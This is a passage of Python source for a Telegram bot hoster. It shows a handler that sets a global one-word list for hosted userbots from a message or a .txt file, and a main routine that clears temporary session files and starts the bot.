                    if mime and mime.startswith("text/"):
                        is_text = True
                    elif replied.document.attributes:
                        for attr in replied.document.attributes:
                            if hasattr(attr, 'file_name') and attr.file_name and attr.file_name.lower().endswith('.txt'):
                                is_text = True
                                break
                    if is_text:
                        try:
                            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as tmp:
                                tmp_path = tmp.name
                            await self.bot.download_media(replied, file=tmp_path)
                            with open(tmp_path, "r", encoding="utf-8") as f:
                                content = f.read()
                            os.unlink(tmp_path)
                        except Exception as e:
                            await reply_quote(event,
                                f"╭─❖ ᴇʀʀᴏʀ\n"
                                "│\n"
                                f"├─➤ ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴀᴅ ғɪʟᴇ: {e}\n"
                                "│\n"
                                "╰─➤ ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ."
                            )
                            return
                    else:
                        await reply_quote(event,
                            "╭─❖ ᴇʀʀᴏʀ\n"
                            "│\n"
                            "├─➤ ʀᴇᴘʟɪᴇᴅ ғɪʟᴇ ɪs ɴᴏᴛ ᴀ ᴛᴇxᴛ ғɪʟᴇ.\n"
                            "│\n"
                            "╰─➤ ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ .ᴛxᴛ ғɪʟᴇ."
                        )
                        return
                if content:
                    words = content.strip().split()
                else:
                    await reply_quote(event,
                        "╭─❖ ᴇʀʀᴏʀ\n"
                        "│\n"
                        "├─➤ ɴᴏ ᴛᴇxᴛ ᴄᴏɴᴛᴇɴᴛ ғᴏᴜɴᴅ.\n"
                        "│\n"
                        "╰─➤ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴛᴇxᴛ ᴍᴇssᴀɢᴇ ᴏʀ ғɪʟᴇ."
                    )
                    return
            else:
                await reply_quote(event,
                    "╭─❖ ᴜsᴀɢᴇ ᴇʀʀᴏʀ\n"
                    "│\n"
                    "├─➤ /ɢsᴇᴛᴏɴᴇᴡᴏʀᴅ ᴡᴏʀᴅ1 ᴡᴏʀᴅ2 ...\n"
                    "├─➤ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴛᴇxᴛ ᴍᴇssᴀɢᴇ/ғɪʟᴇ.\n"
                    "│\n"
                    "╰─➤ ᴛʜɪs sᴇᴛs ᴛʜᴇ ɢʟᴏʙᴀʟ ᴏɴᴇᴡᴏʀᴅ ʟɪsᴛ ғᴏʀ ᴀʟʟ ᴜsᴇʀʙᴏᴛs."
                )
                return
        if not words:
            await reply_quote(event,
                "╭─❖ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ ɴᴏ ᴡᴏʀᴅs ᴘʀᴏᴠɪᴅᴇᴅ.\n"
                "│\n"
                "╰─➤ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀᴛ ʟᴇᴀsᴛ ᴏɴᴇ ᴡᴏʀᴅ."
            )
            return
        set_global_oneword_list(words)
        await reply_quote(event,
            f"╭─❖ ɢʟᴏʙᴀʟ ᴏɴᴇᴡᴏʀᴅ ʟɪsᴛ ᴜᴘᴅᴀᴛᴇᴅ\n"
            "│\n"
            f"├─➤ ᴡᴏʀᴅs ᴀᴅᴅᴇᴅ : {len(words)}\n"
            "│\n"
            "╰─➤ ᴀʟʟ ᴜsᴇʀʙᴏᴛs ᴡɪʟʟ ᴜsᴇ ᴛʜɪs ʟɪsᴛ ɪғ ᴛʜᴇʏ ʜᴀᴠᴇ ɴᴏ ᴘᴇʀsᴏɴᴀʟ ᴅᴇғᴀᴜʟᴛ."
        )

# =====================================================================
# MAIN
# =====================================================================
async def main():
    print("🚀 Starting Auto Tagger Hoster...")
    for f in os.listdir("."):
        if f == "hoster_bot.session" or f == "hoster_bot.session-journal":
            continue
        if f.endswith(".session") or f.endswith(".session-journal"):
            if f.startswith("temp_") or f.startswith("user_") or "sessions" in f:
                os.remove(f)
                print(f"🗑️ Removed: {f}")
    try:
        bot = HosterBot()
        await bot.start()
    except FloodWaitError as e:
        print(f"\n⏳ Flood wait: {e.seconds} seconds")
        print(f"👉 Wait or get new token from @BotFather")
    except Exception as e:
        print(f"❌ Failed to start: {e}")
        raise

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Shutting down...")
    except Exception as e:
        print(f"❌ Error: {e}")
        sys.exit(1)